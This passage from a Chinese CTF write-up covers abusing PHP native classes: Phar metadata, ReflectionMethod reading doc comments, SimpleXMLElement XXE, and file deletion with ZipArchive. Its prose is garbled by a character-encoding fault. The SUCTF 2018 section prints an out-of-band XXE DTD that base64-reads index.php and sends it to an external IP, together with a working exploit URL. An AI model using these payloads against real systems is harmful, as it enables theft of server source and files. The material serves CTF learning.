//åç¼€åå¿…é¡»ä¸ºphar$phar-&gt;startBuffering(); //å¼€å§‹ç¼“å†² Phar å†™æ“ä½œ$phar-&gt;setStub(&#39;&lt;script language=&quot;php&quot;&gt; __HALT_COMPILER();&lt;/script&gt;&#39;); //è®¾ç½®stub$o = new File($f);$phar-&gt;setMetadata($o); //å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶//ç­¾åè‡ªåŠ¨è®¡ç®—$phar-&gt;stopBuffering();?&gt;</code></pre><p>è¯¦ç»†è¿‡ç¨‹å¯æŸ¥çœ‹:<a href="https://www.yuque.com/docs/share/ad3f54ca-b95b-4aa9-add6-e6e8e82be57c#">https://www.yuque.com/docs/share/ad3f54ca-b95b-4aa9-add6-e6e8e82be57c?#</a> ã€Šwebåˆ·é¢˜ã€‹</p><h1 id="åˆ©ç”¨ReflectionMethodè¯»å–Userç±»çš„æ–¹æ³•"><a href="#åˆ©ç”¨ReflectionMethodè¯»å–Userç±»çš„æ–¹æ³•" class="headerlink" title="åˆ©ç”¨ReflectionMethodè¯»å–Userç±»çš„æ–¹æ³•"></a>åˆ©ç”¨ReflectionMethodè¯»å–Userç±»çš„æ–¹æ³•</h1><h2 id="ReflectionMethodç±»"><a href="#ReflectionMethodç±»" class="headerlink" title="ReflectionMethodç±»"></a>ReflectionMethodç±»</h2><p>ReflectionMethodçš„ç±»æŠ¥å‘Šäº†æ–¹æ³•çš„ç›¸å…³ä¿¡æ¯<br>ç‰ˆæœ¬ï¼š(PHP 5, PHP 7, PHP 8)</p><h3 id="ReflectionClass-API"><a href="#ReflectionClass-API" class="headerlink" title="ReflectionClass API"></a>ReflectionClass API</h3><pre><code class="php">$ref = new ReflectionClass(B::class);//print_r(ReflectionClass::export(demo::class));print_r($ref-&gt;getProperties()); // è·å–ä¸€çº§å±æ€§, å¯ä»¥ä¼ å‚æ•°è¿‡æ»¤, è¿”å›ReflectionProperty å¯¹è±¡çš„æ•°ç»„ã€‚var_dump($ref-&gt;getConstructor()); // è·å–æ„é€ å‡½æ•°, æœªå®šä¹‰è¿”å›nullvar_dump($ref-&gt;inNamespace()); // æ˜¯å¦åœ¨å‘½åç©ºé—´ä¸­var_dump($ref-&gt;getConstants()); // è·å–æ‰€æœ‰å®šä¹‰çš„å¸¸é‡var_dump($ref-&gt;getConstant(&#39;TEST_1&#39;)); // è·å–æŸä¸ªå¸¸é‡print_r($ref-&gt;getDefaultProperties()); // è·å–é»˜è®¤å±æ€§, è¿”å›æ•°ç»„, åŒ…æ‹¬çˆ¶ç±»çš„å±æ€§var_dump($ref-&gt;getDocComment()); // è·å–ç±»æ–‡æ¡£æ³¨é‡Š, ä¸åŒ…å«å±æ€§å’Œæ–¹æ³•çš„æ³¨é‡Š, æ— æ³¨é‡Šè¿”å›falsevar_dump($ref-&gt;getExtension()); // è·å–è·å–æœ€åä¸€è¡Œçš„è¡Œæ•°var_dump($ref-&gt;getFileName()); // è·å–å®šä¹‰ç±»çš„æ–‡ä»¶å, è¿”å›ç»å¯¹è·¯å¾„var_dump($ref-&gt;getInterfaceNames()); // è·å–æ¥å£åç§°, è¿”å›ç´¢å¼•æ•°ç»„,å€¼ä¸ºæ¥å£åç§°, æœªå®ç°æ¥å£è¿”å›ç©ºæ•°ç»„var_dump($ref-&gt;getInterfaces()); // è·å–æ¥å£, è¿”å›å…³è”æ•°ç»„, name=&gt;ReflectionClasså®ä¾‹, æœªå®ç°æ¥å£è¿”å›ç©ºæ•°ç»„var_dump($ref-&gt;getMethods()); // æŒ‡è·å–ç±»æ–¹æ³• ReflectionMethodã€‚var_dump($ref-&gt;getMethod(&#39;foo4&#39;)); // è·å–ä¸€ä¸ªç±»æ–¹æ³•çš„ ReflectionMethodã€‚å¦‚æœæ–¹æ³•ä¸å­˜åœ¨ä¼šæŠ›å‡ºå¼‚å¸¸, éœ€è¦é…åˆtry catchä¸€èµ·ç”¨var_dump($ref-&gt;getName()); // è·å–ç±»å, åŒ…å«å‘½åç©ºé—´var_dump($ref-&gt;getNamespaceName()); // è·å–å‘½åç©ºé—´çš„åç§°, æ²¡æœ‰è¿”å›ç©ºvar_dump($ref-&gt;getParentClass()); // è·å–çˆ¶ç±»reflectionClassçš„å®ä¾‹, æ²¡æœ‰çˆ¶ç±»è¿”å›falsevar_dump($ref-&gt;getProperty(&#39;prop3&#39;)); // è·å–ä¸€ä¸ªå±æ€§, è¿”å›ReflectionPropertyå®ä¾‹, å±æ€§ä¸å­˜åœ¨ä¼šæŠ›å‡ºå¼‚å¸¸, éœ€é…åˆtry catchä½¿ç”¨var_dump($ref-&gt;getShortName()); // è·å–ç±»å, ä¸åŒ…å«å‘½åç©ºé—´var_dump($ref-&gt;getStartLine()); // è·å–èµ·å§‹è¡Œå·print_r($ref-&gt;getStaticProperties()); // è·å–é™æ€å±æ€§print_r($ref-&gt;getStaticPropertyValue(&#39;prop_static&#39;)); // è·å–é™æ€å±æ€§å€¼, æœªå®šä¹‰çš„å±æ€§ä¼šæŠ¥è‡´å‘½é”™è¯¯print_r($ref-&gt;getTraitAliases()); // è¿”å› trait åˆ«åçš„ä¸€ä¸ªæ•°ç»„print_r($ref-&gt;getTraitNames()); // è¿”å› trait åˆ«åçš„ä¸€ä¸ªæ•°ç»„print_r($ref-&gt;getTraits()); // è¿”å›è¿™ä¸ªç±»æ‰€ä½¿ç”¨çš„ traits æ•°ç»„var_dump($ref-&gt;hasConstant(&#39;AB&#39;)); // æ£€æŸ¥å¸¸é‡æ˜¯å¦å·²ç»å®šä¹‰var_dump($ref-&gt;hasMethod(&#39;AB&#39;)); // æ£€æŸ¥æ–¹æ³•æ˜¯å¦å·²ç»å®šä¹‰var_dump($ref-&gt;hasProperty(&#39;AB&#39;)); // æ£€æŸ¥å±æ€§æ˜¯å¦å·²å®šä¹‰var_dump($ref-&gt;implementsInterface(&#39;reflection\Abc&#39;)); // æ£€æŸ¥æ˜¯å¦å®ç°äº†æŸä¸ªæ¥å£, æ³¨æ„éœ€è¦å¸¦ä¸Šå‘½åç©ºé—´var_dump($ref-&gt;isAbstract()); // æ£€æŸ¥ç±»æ˜¯å¦æ˜¯æŠ½è±¡ç±»ï¼ˆabstractï¼‰var_dump($ref-&gt;isAnonymous()); // æ£€æŸ¥ç±»æ˜¯å¦æ˜¯åŒ¿åç±»var_dump($ref-&gt;isCloneable()); // è¿”å›äº†ä¸€ä¸ªç±»æ˜¯å¦å¯å¤åˆ¶var_dump($ref-&gt;isFinal()); // æ£€æŸ¥ç±»æ˜¯å¦å£°æ˜ä¸º finalvar_dump($ref-&gt;isInstance($obj)); // æ£€æŸ¥ä¸€ä¸ªå˜é‡æ˜¯å¦æ­¤ç±»çš„å®ä¾‹var_dump($ref-&gt;isInstantiable()); // æ£€æŸ¥ç±»æ˜¯å¦å¯å®ä¾‹åŒ–var_dump($ref-&gt;isInterface()); // æ£€æŸ¥ç±»æ˜¯å¦æ˜¯ä¸€ä¸ªæ¥å£ï¼ˆinterfaceï¼‰var_dump($ref-&gt;isInternal()); // æ£€æŸ¥ç±»æ˜¯å¦ç”±æ‰©å±•æˆ–æ ¸å¿ƒåœ¨å†…éƒ¨å®šä¹‰, å’ŒisUserDefinedç›¸å¯¹var_dump($ref-&gt;isIterateable()); // æ£€æŸ¥æ­¤ç±»æ˜¯å¦å¯è¿­ä»£, å®ç°äº†Iteratoræ¥å£å³å¯è¿­ä»£var_dump($ref-&gt;isSubclassOf(A::class)); // æ˜¯å¦æ˜¯æŸä¸€ä¸ªç±»çš„å­ç±»var_dump($ref-&gt;isTrait()); // è¿”å›äº†æ˜¯å¦ä¸ºä¸€ä¸ª traitvar_dump($ref-&gt;isUserDefined()); // æ£€æŸ¥æ˜¯å¦ç”±ç”¨æˆ·å®šä¹‰çš„ç±» å’ŒisInternalç›¸å¯¹// ä»æŒ‡å®šçš„å‚æ•°åˆ›å»ºä¸€ä¸ªæ–°çš„ç±»å®ä¾‹,åˆ›å»ºç±»çš„æ–°çš„å®ä¾‹ã€‚ç»™å‡ºçš„å‚æ•°å°†ä¼šä¼ é€’åˆ°ç±»çš„æ„é€ å‡½æ•°ã€‚// æ¥å—å¯å˜æ•°ç›®çš„å‚æ•°ï¼Œç”¨äºä¼ é€’åˆ°ç±»çš„æ„é€ å‡½æ•°ï¼Œå’Œ call_user_func() å¾ˆç›¸ä¼¼ã€‚var_dump($ref-&gt;newInstance());// ä»æŒ‡å®šçš„å‚æ•°åˆ›å»ºä¸€ä¸ªæ–°çš„ç±»å®ä¾‹,åˆ›å»ºç±»çš„æ–°çš„å®ä¾‹ã€‚ç»™å‡ºçš„å‚æ•°å°†ä¼šä¼ é€’åˆ°ç±»çš„æ„é€ å‡½æ•°ã€‚//è¿™ä¸ªå‚æ•°ä»¥ array å½¢å¼ä¼ é€’åˆ°ç±»çš„æ„é€ å‡½æ•°ã€‚var_dump($ref-&gt;newInstanceArgs([]));var_dump($ref-&gt;newInstanceWithoutConstructor()); // åˆ›å»ºä¸€ä¸ªæ–°çš„å®ä¾‹è€Œä¸è°ƒç”¨ä»–çš„æ„é€ å‡½æ•°$ref-&gt;setStaticPropertyValue (&#39;prop_static&#39;, &#39;222&#39;); // è®¾ç½®é™æ€å±æ€§çš„å€¼, æ— è¿”å›å€¼var_dump($ref-&gt;__toString ()); // è¿”å› ReflectionClass å¯¹è±¡å­—ç¬¦ä¸²çš„è¡¨ç¤ºå½¢å¼ã€‚</code></pre><pre><code>### ReflectionMethod API```php/*ReflectionMethod::__construct â€” ReflectionMethod çš„æ„é€ å‡½æ•°ReflectionMethod::export â€” è¾“å‡ºä¸€ä¸ªå›è°ƒæ–¹æ³•ReflectionMethod::getClosure â€” è¿”å›ä¸€ä¸ªåŠ¨æ€å»ºç«‹çš„æ–¹æ³•è°ƒç”¨æ¥å£ï¼Œè¯‘è€…æ³¨ï¼šå¯ä»¥ä½¿ç”¨è¿™ä¸ªè¿”å›å€¼ç›´æ¥è°ƒç”¨éå…¬å¼€æ–¹æ³•ã€‚ReflectionMethod::getDeclaringClass â€” è·å–è¢«åå°„çš„æ–¹æ³•æ‰€åœ¨ç±»çš„åå°„å®ä¾‹ReflectionMethod::getModifiers â€” è·å–æ–¹æ³•çš„ä¿®é¥°ç¬¦ReflectionMethod::getPrototype â€” è¿”å›æ–¹æ³•åŸå‹ (å¦‚æœå­˜åœ¨)ReflectionMethod::invoke â€” InvokeReflectionMethod::invokeArgs â€” å¸¦å‚æ•°æ‰§è¡ŒReflectionMethod::isAbstract â€” åˆ¤æ–­æ–¹æ³•æ˜¯å¦æ˜¯æŠ½è±¡æ–¹æ³•ReflectionMethod::isConstructor â€” åˆ¤æ–­æ–¹æ³•æ˜¯å¦æ˜¯æ„é€ æ–¹æ³•ReflectionMethod::isDestructor â€” åˆ¤æ–­æ–¹æ³•æ˜¯å¦æ˜¯ææ„æ–¹æ³•ReflectionMethod::isFinal â€” åˆ¤æ–­æ–¹æ³•æ˜¯å¦å®šä¹‰ finalReflectionMethod::isPrivate â€” åˆ¤æ–­æ–¹æ³•æ˜¯å¦æ˜¯ç§æœ‰æ–¹æ³•ReflectionMethod::isProtected â€” åˆ¤æ–­æ–¹æ³•æ˜¯å¦æ˜¯ä¿æŠ¤æ–¹æ³• (protected)ReflectionMethod::isPublic â€” åˆ¤æ–­æ–¹æ³•æ˜¯å¦æ˜¯å…¬å¼€æ–¹æ³•ReflectionMethod::isStatic â€” åˆ¤æ–­æ–¹æ³•æ˜¯å¦æ˜¯é™æ€æ–¹æ³•ReflectionMethod::setAccessible â€” è®¾ç½®æ–¹æ³•æ˜¯å¦è®¿é—®ReflectionMethod::__toString â€” è¿”å›åå°„æ–¹æ³•å¯¹è±¡çš„å­—ç¬¦ä¸²è¡¨è¾¾*/ReflectionMethod extends ReflectionFunctionAbstract implements Reflector &#123;/* å¸¸é‡ */const integer IS_STATIC = 1 ;const integer IS_PUBLIC = 256 ;const integer IS_PROTECTED = 512 ;const integer IS_PRIVATE = 1024 ;const integer IS_ABSTRACT = 2 ;const integer IS_FINAL = 4 ;/* å±æ€§ */public $name ;public $class ;/* æ–¹æ³• */public __construct ( mixed $class , string $name )public static export ( string $class , string $name [, bool $return = false ] ) : stringpublic getClosure ( object $object ) : Closurepublic getDeclaringClass ( ) : ReflectionClasspublic getModifiers ( ) : intpublic getPrototype ( ) : ReflectionMethodpublic invoke ( object $object [, mixed $parameter [, mixed $... ]] ) : mixedpublic invokeArgs ( object $object , array $args ) : mixedpublic isAbstract ( ) : boolpublic isConstructor ( ) : boolpublic isDestructor ( ) : boolpublic isFinal ( ) : boolpublic isPrivate ( ) : boolpublic isProtected ( ) : boolpublic isPublic ( ) : boolpublic isStatic ( ) : boolpublic setAccessible ( bool $accessible ) : voidpublic __toString ( ) : string/* ç»§æ‰¿çš„æ–¹æ³• */final private ReflectionFunctionAbstract::__clone ( ) : voidpublic ReflectionFunctionAbstract::getClosureScopeClass ( ) : ReflectionClasspublic ReflectionFunctionAbstract::getClosureThis ( ) : objectpublic ReflectionFunctionAbstract::getDocComment ( ) : stringpublic ReflectionFunctionAbstract::getEndLine ( ) : intpublic ReflectionFunctionAbstract::getExtension ( ) : ReflectionExtensionpublic ReflectionFunctionAbstract::getExtensionName ( ) : stringpublic ReflectionFunctionAbstract::getFileName ( ) : stringpublic ReflectionFunctionAbstract::getName ( ) : stringpublic ReflectionFunctionAbstract::getNamespaceName ( ) : stringpublic ReflectionFunctionAbstract::getNumberOfParameters ( ) : intpublic ReflectionFunctionAbstract::getNumberOfRequiredParameters ( ) : intpublic ReflectionFunctionAbstract::getParameters ( ) : arraypublic ReflectionFunctionAbstract::getReturnType ( ) : ReflectionTypepublic ReflectionFunctionAbstract::getShortName ( ) : stringpublic ReflectionFunctionAbstract::getStartLine ( ) : intpublic ReflectionFunctionAbstract::getStaticVariables ( ) : arraypublic ReflectionFunctionAbstract::hasReturnType ( ) : boolpublic ReflectionFunctionAbstract::inNamespace ( ) : boolpublic ReflectionFunctionAbstract::isClosure ( ) : boolpublic ReflectionFunctionAbstract::isDeprecated ( ) : boolpublic ReflectionFunctionAbstract::isGenerator ( ) : boolpublic ReflectionFunctionAbstract::isInternal ( ) : boolpublic ReflectionFunctionAbstract::isUserDefined ( ) : boolpublic ReflectionFunctionAbstract::isVariadic ( ) : boolpublic ReflectionFunctionAbstract::returnsReference ( ) : boolabstract public ReflectionFunctionAbstract::__toString ( ) : void&#125;</code></pre><h2 id="ç¬¬åå››å±Šå…¨å›½ä¿¡æ¯å®‰å…¨ç«èµ›-easy-resource"><a href="#ç¬¬åå››å±Šå…¨å›½ä¿¡æ¯å®‰å…¨ç«èµ›-easy-resource" class="headerlink" title="[ç¬¬åå››å±Šå…¨å›½ä¿¡æ¯å®‰å…¨ç«èµ›]easy_resource"></a>[ç¬¬åå››å±Šå…¨å›½ä¿¡æ¯å®‰å…¨ç«èµ›]easy_resource</h2><p><strong>ç›®å½•æ‰«æå¯è·å¾—æºç :</strong></p><pre><code class="php">&lt;?phpclass User&#123;    private static $c = 0;    function a()    &#123;        return ++self::$c;    &#125;    function b()    &#123;        return ++self::$c;    &#125;    function c()    &#123;        return ++self::$c;    &#125;    function d()    &#123;        return ++self::$c;    &#125;    function e()    &#123;        return ++self::$c;    &#125;    function f()    &#123;        return ++self::$c;    &#125;    function g()    &#123;        return ++self::$c;    &#125;    function h()    &#123;        return ++self::$c;    &#125;    function i()    &#123;        return ++self::$c;    &#125;    function j()    &#123;        return ++self::$c;    &#125;    function k()    &#123;        return ++self::$c;    &#125;    function l()    &#123;        return ++self::$c;    &#125;    function m()    &#123;        return ++self::$c;    &#125;    function n()    &#123;        return ++self::$c;    &#125;    function o()    &#123;        return ++self::$c;    &#125;    function p()    &#123;        return ++self::$c;    &#125;    function q()    &#123;        return ++self::$c;    &#125;    function r()    &#123;        return ++self::$c;    &#125;    function s()    &#123;        return ++self::$c;    &#125;    function t()    &#123;        return ++self::$c;    &#125;&#125;$rc=$_GET[&quot;rc&quot;];$rb=$_GET[&quot;rb&quot;];$ra=$_GET[&quot;ra&quot;];$rd=$_GET[&quot;rd&quot;];$method= new $rc($ra, $rb);var_dump($method-&gt;$rd());</code></pre><p>å¯åˆ©ç”¨åŸç”Ÿçš„åå°„ç±»è¿›è¡Œè¯»å–ï¼Œé¢˜ç›®è¯´åœ¨çœ‹ä¸åˆ°çš„åœ°æ–¹ï¼ŒçŒœæµ‹æ˜¯åœ¨æ³¨é‡Šçš„åœ°æ–¹<br>å¯æ„é€ payload:</p><pre><code class="php">?rc=ReflectionMethod&amp;ra=User&amp;rb=a&amp;rd=getDocComment</code></pre><p>ç¿»è¯‘ä¸€ä¸‹å°±æ˜¯:</p><pre><code class="php">$method = new ReflectionMethod(User,a);var_dump($method-&gt;getDocComment); //getDocCommentè·å–æ–‡æ¡£æ³¨é‡Š</code></pre><p>ç”±äºä¸çŸ¥é“æ˜¯åœ¨å“ªä¸ªæ–¹æ³•å†…ï¼Œæ‰€ä»¥å¯ä»¥è¿›è¡Œéå†<br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665485044657-d5e28374-5468-4f38-a96b-d076e14ca3f9.png" alt="img"></p><h1 id="ä½¿ç”¨-SimpleXMLElement-ç±»è¿›è¡Œ-XXE"><a href="#ä½¿ç”¨-SimpleXMLElement-ç±»è¿›è¡Œ-XXE" class="headerlink" title="ä½¿ç”¨ SimpleXMLElement ç±»è¿›è¡Œ XXE"></a>ä½¿ç”¨ SimpleXMLElement ç±»è¿›è¡Œ XXE</h1><p> SimpleXMLElement è¿™ä¸ªå†…ç½®ç±»ç”¨äºè§£æ XML æ–‡æ¡£ä¸­çš„å…ƒç´ ã€‚  </p><h2 id="SimpleXMLElement-ç±»"><a href="#SimpleXMLElement-ç±»" class="headerlink" title="SimpleXMLElement ç±»"></a>SimpleXMLElement ç±»</h2><p> å®˜æ–¹æ–‡æ¡£ä¸­å¯¹äºSimpleXMLElement ç±»çš„æ„é€ æ–¹æ³• SimpleXMLElement::__construct çš„å®šä¹‰å¦‚ä¸‹ï¼š<br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665487834374-89b18cf7-62f3-4f6d-8772-86dcad3bdbbd.png" alt="img"><br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665487841658-6b4bb837-d7b0-40a2-8dd4-58841f416edb.png" alt="img"><br>å¯ä»¥çœ‹åˆ°é€šè¿‡è®¾ç½®ç¬¬ä¸‰ä¸ªå‚æ•° data_is_url ä¸º trueï¼Œæˆ‘ä»¬å¯ä»¥å®ç°è¿œç¨‹xmlæ–‡ä»¶çš„è½½å…¥ã€‚ç¬¬äºŒä¸ªå‚æ•°çš„å¸¸é‡å€¼æˆ‘ä»¬è®¾ç½®ä¸º2å³å¯ã€‚ç¬¬ä¸€ä¸ªå‚æ•° data å°±æ˜¯æˆ‘ä»¬è‡ªå·±è®¾ç½®çš„payloadçš„urlåœ°å€ï¼Œå³ç”¨äºå¼•å…¥çš„å¤–éƒ¨å®ä½“çš„urlã€‚<br>è¿™æ ·çš„è¯ï¼Œå½“æˆ‘ä»¬å¯ä»¥æ§åˆ¶ç›®æ ‡è°ƒç”¨çš„ç±»çš„æ—¶å€™ï¼Œä¾¿å¯ä»¥é€šè¿‡ SimpleXMLElement è¿™ä¸ªå†…ç½®ç±»æ¥æ„é€  XXEã€‚</p><h2 id="SUCTF-2018-Homework"><a href="#SUCTF-2018-Homework" class="headerlink" title="[SUCTF 2018]Homework"></a>[SUCTF 2018]Homework</h2><p>éšä¾¿æ³¨å†Œä¸€ä¸ªè´¦æˆ·å‘ç°å¦‚ä¸‹æºç <br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665933717474-8039a055-da9e-450d-b80a-9cf05791eb7f.png" alt="img"></p><pre><code class="php">&lt;?php class calc&#123;    function __construct__()&#123;        calc();    &#125;    function calc($args1,$method,$args2)&#123;        $args1=intval($args1);        $args2=intval($args2);        switch ($method) &#123;            case &#39;a&#39;:                $method=&quot;+&quot;;                break;            case &#39;b&#39;:                $method=&quot;-&quot;;                break;            case &#39;c&#39;:                $method=&quot;*&quot;;                break;            case &#39;d&#39;:                $method=&quot;/&quot;;                break;                        default:                die(&quot;invalid input&quot;);        &#125;        $Expression=$args1.$method.$args2;        eval(&quot;\$r=$Expression;&quot;);        die(&quot;Calculation results:&quot;.$r);    &#125;&#125;?&gt;        </code></pre><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665933869850-f292420e-807a-4315-9ae4-97d12651944b.png" alt="img"><br>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨SimpleXMLElementç±»<br>æˆ‘ä»¬æ„é€ çš„xmlå¦‚ä¸‹:<br>test.xml</p><pre><code class="php">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE try[&lt;!ENTITY % int SYSTEM &quot;http://108.166.201.16:8000/evil.dtd&quot;&gt;%int;%all;%send;]&gt;</code></pre><p>evil.dtd</p><pre><code class="php">&lt;!ENTITY % payl SYSTEM &quot;php://filter/read=convert.base64-encode/resource=index.php&quot;&gt;&lt;!ENTITY % all &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http://108.166.201.16:5555/?%payl;&#39;&gt;&quot;&gt;</code></pre><p>åœ¨vpsä¸Šæ”¾ä¸Šè¿™ä¸¤ä¸ªæ–‡ä»¶<br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665934117600-563713ba-7b9f-40ba-9e24-4b49b463c64a.png" alt="img"><br>ç„¶åå†ä½¿ç”¨vpsç›‘å¬5555ç«¯å£<br>æœ€ç»ˆæ„é€ payload</p><pre><code class="php">http://16c35a6e-0285-4dc1-9c3d-2acf598489fc.node4.buuoj.cn:81/show.php?module=SimpleXMLElement&amp;args[]=http://108.166.201.16:8000/test.xml&amp;args[]=2&amp;args[]=true</code></pre><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æ¥å—åˆ°äº†æ•°æ®ï¼Œbase64è§£ç å³å¯<br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665934164637-826456e2-a39d-499b-96c6-528cbaa8a0f9.png" alt="img"><br>åŒç†å¯è·å¾—å…¶ä»–é¡µé¢æºç </p><h1 id="ä½¿ç”¨-ZipArchive-ç±»æ¥åˆ é™¤æ–‡ä»¶"><a href="#ä½¿ç”¨-ZipArchive-ç±»æ¥åˆ é™¤æ–‡ä»¶" class="headerlink" title="ä½¿ç”¨ ZipArchive ç±»æ¥åˆ é™¤æ–‡ä»¶"></a>ä½¿ç”¨ ZipArchive ç±»æ¥åˆ é™¤æ–‡ä»¶</h1><h2 id="ZipArchive-ç±»"><a href="#ZipArchive-ç±»" class="headerlink" title="ZipArchive ç±»"></a>ZipArchive ç±»</h2><p>PHP ZipArchiveç±»æ˜¯PHPçš„ä¸€ä¸ªåŸç”Ÿç±»ï¼Œå®ƒæ˜¯åœ¨PHP 5.20ä¹‹åå¼•å…¥çš„ã€‚ZipArchiveç±»å¯ä»¥å¯¹æ–‡ä»¶è¿›è¡Œå‹ç¼©ä¸è§£å‹ç¼©å¤„ç†ã€‚<br>ä¸‹é¢åˆ—ä¸¾å‡ ä¸ªå¸¸è§çš„ç±»æ–¹æ³•ï¼š</p><ul><li><a href="https://www.php.net/manual/zh/ziparchive.addemptydir.php">ZipArchive::addEmptyDir</a>ï¼šæ·»åŠ ä¸€ä¸ªæ–°çš„æ–‡ä»¶ç›®å½•</li><li><a href="https://www.php.net/manual/zh/ziparchive.addfile.php">ZipArchive::addFile</a>ï¼šå°†æ–‡ä»¶æ·»åŠ åˆ°æŒ‡å®šzipå‹ç¼©åŒ…ä¸­</li><li><a href="https://www.php.net/manual/zh/ziparchive.addfromstring.php">ZipArchive::addFromString</a>ï¼šæ·»åŠ æ–°çš„æ–‡ä»¶åŒæ—¶å°†å†…å®¹æ·»åŠ è¿›å»</li><li><a href="https://www.php.net/manual/zh/ziparchive.close.php">ZipArchive::close</a>ï¼šå…³é—­ziparchive</li><li><a href="https://www.php.net/manual/zh/ziparchive.extractto.php">ZipArchive::extractTo</a>ï¼šå°†å‹ç¼©åŒ…è§£å‹</li><li><a href="https://www.php.net/manual/zh/ziparchive.open.php">ZipArchive::open</a>ï¼šæ‰“å¼€ä¸€ä¸ªzipå‹ç¼©åŒ…</li><li><a href="https://www.php.net/manual/zh/ziparchive.deleteindex.php">ZipArchive::deleteIndex</a>ï¼šåˆ é™¤å‹ç¼©åŒ…ä¸­çš„æŸä¸€ä¸ªæ–‡ä»¶ï¼Œå¦‚ï¼šdeleteIndex(0)ä»£è¡¨åˆ é™¤ç¬¬ä¸€ä¸ªæ–‡ä»¶</li><li><a href="https://www.php.net/manual/zh/ziparchive.deletename.php">ZipArchive::deleteName</a>ï¼šåˆ é™¤å‹ç¼©åŒ…ä¸­çš„æŸä¸€ä¸ªæ–‡ä»¶åç§°ï¼ŒåŒæ—¶ä¹Ÿå°†æ–‡ä»¶åˆ é™¤</li><li>â€¦â€¦</li></ul><p>æˆ‘ä»¬æ¥é‡ç‚¹çœ‹çœ‹ ZipArchive::open æ–¹æ³•ï¼š</p><pre><code class="php">ZipArchive::open(string $filename, int $flags=0)</code></pre><p>è¯¥æ–¹æ³•ç”¨æ¥æ‰“å¼€ä¸€ä¸ªæ–°çš„æˆ–ç°æœ‰çš„zipå­˜æ¡£ä»¥è¿›è¡Œè¯»å–ï¼Œå†™å…¥æˆ–ä¿®æ”¹ã€‚</p><ul><li>filenameï¼šè¦æ‰“å¼€çš„ZIPå­˜æ¡£çš„æ–‡ä»¶åã€‚</li><li>flagsï¼šç”¨äºæ‰“å¼€æ¡£æ¡ˆçš„æ¨¡å¼ã€‚æœ‰ä»¥ä¸‹å‡ ç§æ¨¡å¼ï¼š <ul><li>ZipArchive::OVERWRITEï¼šæ€»æ˜¯ä»¥ä¸€ä¸ªæ–°çš„å‹ç¼©åŒ…å¼€å§‹ï¼Œæ­¤æ¨¡å¼ä¸‹å¦‚æœå·²ç»å­˜åœ¨åˆ™ä¼šè¢«è¦†ç›–æˆ–åˆ é™¤ã€‚</li><li>ZipArchive::CREATEï¼šå¦‚æœä¸å­˜åœ¨åˆ™åˆ›å»ºä¸€ä¸ªzipå‹ç¼©åŒ…ã€‚</li><li>ZipArchive::RDONLYï¼šåªè¯»æ¨¡å¼æ‰“å¼€å‹ç¼©åŒ…ã€‚</li><li>ZipArchive::EXCLï¼šå¦‚æœå‹ç¼©åŒ…å·²ç»å­˜åœ¨ï¼Œåˆ™å‡ºé”™ã€‚</li><li>ZipArchive::CHECKCONSï¼šå¯¹å‹ç¼©åŒ…æ‰§è¡Œé¢å¤–çš„ä¸€è‡´æ€§æ£€æŸ¥ï¼Œå¦‚æœå¤±è´¥åˆ™æ˜¾ç¤ºé”™è¯¯ã€‚</li></ul></li></ul><p>æ³¨æ„ï¼Œå¦‚æœè®¾ç½®flagså‚æ•°çš„å€¼ä¸º ZipArchive::OVERWRITE çš„è¯ï¼Œå¯ä»¥æŠŠæŒ‡å®šæ–‡ä»¶åˆ é™¤ã€‚è¿™é‡Œæˆ‘ä»¬è·Ÿè¿›æ–¹æ³•å¯ä»¥çœ‹åˆ°const OVERWRITE = 8ï¼Œä¹Ÿå°±æ˜¯å°†OVERWRITEå®šä¹‰ä¸ºäº†å¸¸é‡8ï¼Œæˆ‘ä»¬åœ¨è°ƒç”¨æ—¶ä¹Ÿå¯ä»¥ç›´æ¥å°†flagsèµ‹å€¼ä¸º8ã€‚<br>ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ZipArchiveåŸç”Ÿç±»è°ƒç”¨openæ–¹æ³•åˆ é™¤ç›®æ ‡ä¸»æœºä¸Šçš„æ–‡ä»¶ã€‚ä¸‹é¢æˆ‘ä»¬æ¥çœ‹ä¸€é“CTFé¢˜ç›®ã€‚</p><h2 id="æ¢¦é‡ŒèŠ±å¼€ç‰¡ä¸¹äº­"><a href="#æ¢¦é‡ŒèŠ±å¼€ç‰¡ä¸¹äº­" class="headerlink" title="æ¢¦é‡ŒèŠ±å¼€ç‰¡ä¸¹äº­"></a>æ¢¦é‡ŒèŠ±å¼€ç‰¡ä¸¹äº­</h2><p>æºç ä¸‹è½½:<a href="https://raw.githubusercontent.com/fghcvjk/NepCTF-2021/master/%E6%A2%A6%E9%87%8C%E8%8A%B1%E5%BC%80%E7%89%A1%E4%B8%B9%E4%BA%AD.zip">https://raw.githubusercontent.com/fghcvjk/NepCTF-2021/master/%E6%A2%A6%E9%87%8C%E8%8A%B1%E5%BC%80%E7%89%A1%E4%B8%B9%E4%BA%AD.zip</a></p><pre><code class="php">&lt;?phphighlight_file(__FILE__);error_reporting(0);include(&#39;shell.php&#39;);class Game&#123;    public  $username;    public  $password;    public  $choice;    public  $register;    public  $file;    public  $filename;    public  $content;        public function __construct()    &#123;        $this-&gt;username=&#39;user&#39;;        $this-&gt;password=&#39;user&#39;;    &#125;    public function __wakeup()&#123;        if(md5($this-&gt;register)===&quot;21232f297a57a5a743894a0e4a801fc3&quot;)&#123;            $this-&gt;choice=new login($this-&gt;file,$this-&gt;filename,$this-&gt;content);        